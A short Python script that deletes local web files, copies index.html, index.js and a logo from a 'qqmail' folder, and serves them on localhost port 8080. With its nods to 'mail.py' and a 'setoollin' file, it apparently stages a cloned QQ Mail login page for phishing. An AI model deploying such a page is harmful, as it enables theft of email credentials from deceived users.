print("")
print("finish the file mail.py...")
print("finish the file setoollin.py...")
print("finish the file index.html")
print("")
#=================================#
#=================================#
import os
os.system("rm -f index.html")
os.system("rm -f index./js")
os.system("rm -f location.js")
#del the file
os.system("cp qqmail/index.html ./")
os.system("cp qqmail/index.js ./")
os.system("cp qqmail/logo.jpeg ./")
#==================================#
#==================================#
#==================================#
with open("date.txt","a") as f:
    f.write("start the port 8080") 
    f.write("start the mail.py")
import os
print("start the port 8080 on http://127.0.0.1 and http://localhost:8080")
os.system("python3 -m http.server 8080")